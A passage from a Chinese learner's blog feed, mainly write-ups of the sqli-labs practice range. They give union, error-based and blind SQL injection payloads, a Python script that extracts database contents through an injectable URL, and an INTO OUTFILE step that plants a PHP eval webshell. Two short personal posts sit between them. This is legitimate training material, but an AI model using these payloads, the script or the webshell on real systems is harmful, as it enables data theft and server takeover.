class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></div></td></tr></table></figure><p>seconds ： 必要参数，延迟的秒数。</p><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></div></td></tr></table></figure><p>检测数据库的第一个字符的ascii值，再与a的ascii比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小</p></li></ul></li></ul><h4 id="python脚本部分："><a href="#python脚本部分：" class="headerlink" title="python脚本部分："></a>python脚本部分：</h4><ul><li><p>安装request库</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install request<br><span class="hljs-regexp">//</span>win <span class="hljs-number">10</span>下 win+r 输入cmd 运行<br></code></pre></div></td></tr></table></figure></li><li><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># author: eggs</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#playload:</span><br><span class="hljs-comment"># select group_concat(schema_name) from information_schema.schemata</span><br><span class="hljs-comment"># select group_concat(table_name) from information_schema.tables where table_schema=&#x27;  &#x27;</span><br><span class="hljs-comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;  &#x27;and table_name=&#x27;  &#x27;</span><br><span class="hljs-comment"># select  1,2, group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users %23</span><br>dic = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()&#x27;</span><span class="hljs-comment">#基于这个字典循环爆破</span><br>string = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要注入的网址(需包含注入点，并用and连接):&quot;</span>)<span class="hljs-comment">#https://.../?xx=...&#x27;and</span><br>model = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入脚本运行的模式:b~基于bool型的盲注。t~基于时间的盲注。&quot;</span>)<br><span class="hljs-keyword">if</span> model == <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; substr((select group_concat(password) from security.users),&#123;0&#125;,1)=&#123;1&#125; %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">elif</span> model == <span class="hljs-string">&#x27;t&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; if((substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0) %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url + payload)<br>            sec = response.elapsed.seconds<br>            <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error!&quot;</span>)<br></code></pre></div></td></tr></table></figure></li></ul><p>目前能顺利完成任务，但还是比较粗糙，有很多能提升的地方。</p><p>等需要作用于其他更复杂的任务时再来不断完善。</p><p>贴一下运行结果,这是第8关的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"></p><p>9、10关更改一下payload即可</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
      <tag>py脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>俺的博客满月了！</title>
    <link href="/2021/06/13/for-a-month/"/>
    <url>/2021/06/13/for-a-month/</url>
    
    <content type="html"><![CDATA[<p>我好厉害呀！</p><span id="more"></span><hr><p>当初为什么要搭建这个博客呢        </p><p>（这个博客也不能算我搭的…用的框架，甚至还没自己的服务器…）</p><p>是想着写下我的学习记录，督促自己去学习，甚至还能帮到别人    </p><p>（目前为止写的全是吹水水，别人的博客叫技术博客，我的博客叫QQ空间…）</p><p>目前为止嘛，我做的还行吧    </p><p>（四舍五入就是——我好厉害呀！）</p><hr><p>反正都是写给自己看的玩意，俺就是想夸夸俺自己。</p><p>我是菜狗汪汪汪，我爱学习呜呜呜。</p><hr><p>不过为啥文章这么少呢…</p><p>最近其实学了好多东西，不过还有更多的地方没整明白，不好写技术文…</p><p>也经历了好多事，但忙着学技术也没心思写小作文发牢骚了…</p><hr><p>总结完了，投身祖国的建设比在这逼逼赖赖更重要！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大日子！</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原来分开的日子，你数的这么清楚</title>
    <link href="/2021/06/04/cloud-music/"/>
    <url>/2021/06/04/cloud-music/</url>
    
    <content type="html"><![CDATA[<p>总在失去之后才学会怀念。</p><span id="more"></span><hr><p>从没想到分开后你会变得这么卑微，能一天天细数着以前的日子。</p><p>那的确是段快乐的时光，我只记得天地辽阔。</p><p>可你像是急着结束。不多一天，没有拖延。</p><p>可你又像是耐心陪伴。不少一天，不斩丝连。</p><p>没想到有天再见时，你打折了。</p><p>都不重要了，我早就找到了替代你的。</p><p>不瞒你说我甚至还找了俩，分别是小Q和小咪。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/deaa625e58edafa80b88abb0a1bb2f2e.jpg"></p><p>说的就是你，网易云</p><p>几块钱的事怎么这么能惦记啊，都快300天了</p><p>（今天打开网易云时的弹窗，有感而发，请对号入座）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210604180917.png"></p><p><strong>主要你这个会员有啥用，会员到期了就听不了会员时下载的歌合理吗</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/v2-a069e19b50660410b414101dc9a48d40_720w.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql_ilabs闯关历程第一页（1~20）</title>
    <link href="/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/"/>
    <url>/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/</url>
    
    <content type="html"><![CDATA[<p>sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文记录我的闯关历程。</p><span id="more"></span><p>由于确实没啥基础，做这个题还是靠网上教程，争取总结到位，有自己的思考。靶场搭建过程略去。</p><hr><h3 id="sql注入常规流程"><a href="#sql注入常规流程" class="headerlink" title="sql注入常规流程"></a>sql注入常规流程</h3><p><em>先附上我在b站看到的一位up主总结的sql注入大体流程</em></p><ul><li>判断是否有注入<ul><li>可控参数的改变是否能够影响页面显示结果</li><li>输入的sql语句是否能报错——通过数据库的报错，能看到数据库的一些语句痕迹</li><li>输入的sql语句能否不报错——判断我们的语句是否能成功闭合</li></ul></li><li>判断是什么类型的注入</li><li><strong>语句是否能够被恶意修改</strong></li><li><strong>是否能够成功执行</strong></li><li>获取我们想要的数据</li></ul><h3 id="通关历程"><a href="#通关历程" class="headerlink" title="通关历程"></a>通关历程</h3><hr><h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><p> 完成最简单的sql注入。</p><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数，接着union select 1,2,…观察能显示的数据</p></li><li><p>构造语句查询数据库的信息,以查询 security数据库下users表中列名为password和username的字段为例</p><p>（当然，security,users,password和username是一步步爆出来的）：</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询所有的数据库名,查到有“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> %<span class="hljs-number">23</span><br><br>//查询名为“<span class="hljs-keyword">security</span>”的数据库下所有的表名，查到有“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询名为“users”的表下所有的字段名</span><br><span class="hljs-comment">//若不同库下有同名表下同名字段，则查询时where语句后加上 and table_schema=“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">... union <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> security.users %<span class="hljs-number">23</span><br><br>//查询数据库security中uers表的列<span class="hljs-keyword">password</span>和username的所有字段并用‘~’隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p> 输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p><blockquote><p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png" alt="img"></a></p><p> <em>———查询有关double injection的详细信息请点击这里<a href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p></blockquote><p>第一步完全一致，第二步不再用<code>select 1,2...</code>来观察回显，最多可用<code>order by</code>得到<code>union select</code> 的字段数。第三步中语句<code>union select...</code>后面拼接<code>concat((select...)</code>语句，两个select组成双查询。</p><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数</p></li><li><p>构造语句查询数据库的信息<strong>（注意：group_concat函数在这里失效了，故没使用）</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br><br>//查询当前数据库,得知当前数据库为‘security’，如要查别的数据库就<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>（group_concat没了才知道它的好用...）<br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>，直到<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>查到我们需要的表名，如“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//同样<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>知道查到列名username和<span class="hljs-keyword">password</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//查询security.users下第一行的username和<span class="hljs-keyword">password</span>并用“~”隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p> 这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不在显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p><p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png" alt="img"></a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。（好厉害直接就在C盘里塞东西）<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png" alt="img"></a></p><p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里暂时提供一个<a href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618230901.png" alt="img"></a></p><p><em>尝试链接时，最开始我用的菜刀，过了一天就报毒，然后被系统自己删了；然后换了蚁剑，结果连不上，之前连dvwa时也是链接不上，但我都能直接访问….用蚁剑就连起了几个在线靶场的环境。我认为应该就是蚁剑出了问题，可这俩玩意我都是从github上官方下的…这阵子比较忙以后再弄工具</em></p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231315.png" alt="img"></a></p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231725.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618231725.png" alt="img"></a></p><p>（正常的话应该会显示绿色的对话框提示链接成功的）</p><p>因为是直接上传了木马，链接成功的话就能直接控制服务器了。sql注入这个文件上传的漏洞威胁显然是很大的，我感觉以后遇到的情况会很少。</p><hr><h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p> 这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了报错信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p><p>盲注又大概分为布尔型和时间型，其中第8关是布尔型，9、10关是时间型。</p><p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p><p>接下来我会从手注并配合python脚本的方式来完成。</p><p>第8关：</p><ul><li><p>输入单双引号，观察显示信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数（能行但没用）</p><p>因为显示的信息只有两种情况，语句正确时显示一句话”You are in…“,语句错误时没有显示。我们就只能利用这个信息，靠猜的方式去完成注入。这就是使用基于bool类型的注入。</p><p>就像这样：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 5 --+，无显示 (显示异常)</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">6</span> <span class="hljs-comment">--+，显示“you are in...”（显示正常）</span><br>输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 7 --+，显示异常</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>()) = <span class="hljs-number">8</span> <span class="hljs-comment">--+，显示正常</span><br>//说明数据库名长度为<span class="hljs-number">8</span>个字符。<br></code></pre></div></td></tr></table></figure><p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure><p>真的有人会手工注入盲注类型的吗…上脚本。</p><p>关于脚本的编写请见我这一篇文章，传送门：<a href="https://eggswoo.com/2021/06/16/py-script-sql-injection/">用python编写一个sql注入脚本 - 蛋窝窝 (eggswoo.com)</a></p><p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p><p>payload:查找security.users中的password</p><p>对应运行结果</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png" alt="img"></a></p><p>9、10关：</p><p> 因为无论传什么参数结果界面都完全不变，视觉上没有任何信息。所以采用基于时间的盲注方法。</p></li></ul><p> 判断语句是否闭合就需要用到sleep函数</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">输入...id=<span class="hljs-number">1</span><span class="hljs-string">&quot; and sleep(5) %23//页面很快有反应，sleep函数没能生效，证明语句闭合失败输入...id=1&#x27; and sleep(5) %23//等待5秒后页面刷新，证明语句闭合成功 </span><br></code></pre></div></td></tr></table></figure><p>开始构造payload</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp">.../?id=<span class="hljs-number">1&#x27;</span><span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">database(</span>)</span>=<span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)--+<br><span class="hljs-comment">//同样页面延迟了5秒刷新，证明当前数据库名为security</span><br><span class="hljs-comment">//我直接偷了个大懒嘿嘿嘿</span><br></code></pre></div></td></tr></table></figure><p>…可能只有什么大佬才能纯手注完成吧…</p><p>估计大佬也不会用手注这种方式来完成…</p><p>最后贴上用脚本的截图</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png" alt="img"></a></p><hr><h3 id="11-12"><a href="#11-12" class="headerlink" title="11~12"></a>11~12</h3><p> 从这里开始由get类型的注入转变为post类型的注入。之前都是可以直接在浏览器地址栏进行的get类型的注入，而通常post传送的数据不能在url上看到，只能通过抓包工具(burpsuite)，浏览器插件（hackbar）进行查看。无论我们在他给出的登录框怎么输入，上面的url地址栏都不会产生变化。</p><p><a 